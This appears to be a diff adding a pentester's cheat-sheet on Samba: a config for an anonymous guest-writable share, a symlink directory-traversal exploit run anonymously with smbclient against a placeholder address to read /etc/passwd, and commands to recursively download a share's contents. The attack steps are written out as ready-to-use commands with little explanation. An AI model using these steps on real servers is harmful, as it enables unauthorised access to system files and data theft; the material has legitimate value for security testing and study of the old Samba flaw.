@@ -1,0 +1,37 @@
+# samba
+
+# anonymous writable share
+* /etc/samba/smb.conf
+
+[global]
+    log file = /var/log/samba/log
+    dns proxy = No
+    netbios name = SMBSERVER1337
+    server string = Samba Server
+    socket options = TCP_NODELAY
+    workgroup = TEST
+    os level = 20
+    security = share
+    preferred master = no
+    max log size = 50
+
+[pub]
+    guest account = nobody
+    writeable = yes
+    public = yes
+    guest only = yes
+    path = /tmp/smbshare
+
+
+# symlink (http://marc.info/?l=full-disclosure&m=126538598820903&w=2)
+smbclient -U'%' //1.2.3.4/blah
+symlink ../../../../../../../ tst
+more tst/etc/passwd
+posix_unlink lol or mount -t cifs and rm tst
+
+# download directory
+lcd blah
+cd blah
+prompt
+recurse
+mget *
